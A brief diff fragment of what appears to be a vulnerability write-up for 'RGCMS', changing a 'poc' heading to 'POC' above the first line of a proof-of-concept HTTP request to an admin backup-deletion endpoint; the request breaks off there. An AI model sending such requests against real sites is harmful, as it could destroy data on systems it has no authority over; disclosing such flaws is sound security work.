@@ -8,7 +8,7 @@
 "RGCMS"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /admin.php/data/delbackup HTTP/1.1
